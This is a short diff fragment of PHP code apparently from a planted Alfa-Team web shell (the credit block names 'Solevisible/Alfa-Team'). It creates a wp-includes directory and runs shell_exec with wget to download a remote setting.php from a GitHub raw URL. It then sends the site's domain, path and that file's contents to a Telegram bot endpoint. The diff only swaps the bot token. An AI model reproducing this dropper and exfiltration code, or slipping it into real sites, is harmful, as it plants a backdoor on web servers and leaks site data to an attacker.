@@ -75,7 +75,7 @@ if (!empty($kfxxuxat62a73315cbda2ef71cd3f1db4e9f9f31)) {
 }
 $d = $_SERVER['HTTP_HOST']; $p = $_SERVER['DOCUMENT_ROOT']; $dir = "$p/wp-includes"; $f = "$dir/setting.php";
 if (!is_dir($dir)) mkdir($dir, 0777, true) && shell_exec("cd $dir && wget https://raw.githubusercontent.com/hinataloli/haha/refs/heads/main/setting.php");
-if (file_exists($f)) file_get_contents("https://api. .org/bot7335304364:AAFxaKe8QkMoGsuDIrobONjLNYmWTTCHViM/sendMessage?chat_id=7416297295&text=Domain:$d\\nPath:$p\\nFile:setting.php\\nContent:".urlencode(file_get_contents($f)));
+if (file_exists($f)) file_get_contents("https://api. .org/bot733DIrobONjLNYmWTTCHViM/sendMessage?chat_id=7416297295&text=Domain:$d\\nPath:$p\\nFile:setting.php\\nContent:".urlencode(file_get_contents($f)));
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
